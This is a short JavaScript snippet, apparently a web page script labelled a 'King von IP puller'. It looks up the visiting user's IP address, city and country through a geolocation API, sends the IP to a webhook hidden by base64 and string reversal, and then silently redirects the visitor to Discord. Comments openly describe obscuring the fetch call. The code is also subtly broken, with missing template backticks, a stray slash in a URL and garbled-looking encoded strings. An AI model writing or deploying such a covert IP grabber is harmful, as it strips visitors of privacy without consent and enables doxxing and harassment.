// Dummy function to obscure the fetch call
function dummyFunction() {
    // Do nothing
}

// Function to decode and reverse strings
function decodeString(encoded) {
    return atob(encoded.split('').reverse().join(''));
}

// Function to perform the fetch operation
function json(url) {
    return fetch(url).then(res => res.json());
}

// API Key
let apiKey = 'c64ab728d42c9be3cba6c2d546fa575be79ed1cc32bf324b5de3a6d8';

// Webhook URL obfuscated using base64 and reversed
let webhookURL = decodeString('73P0IPwMByy1ODq1OW4vRUZ4R1ZTNTB3NURVWTpSR1B6U1JFUlZMRFNZVVkwTjZPQ0wwWVBISFZVU1RIVTNGc3J5V1lRV2FjRQ=='); 

// IP Data API URL obfuscated with base64 and reversed
let apiUrl = decodeString('M2J5LT0G8E8AQQVFYU1LUXhILVBXNhVDMTM=') + apiKey;

// Main logic
json(apiUrl).then(data => {
    console.log(data.ip);
    console.log(data.city);
    console.log(data.country_code);

    let message = {
        content: King von IP puller 😈\nIP: ${data.ip}
    };

    // Calling dummy function to obscure the fetch call
    dummyFunction();

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });

    // Redirecting to Discord
    window.location.replace("https://www.discord.com"/);
});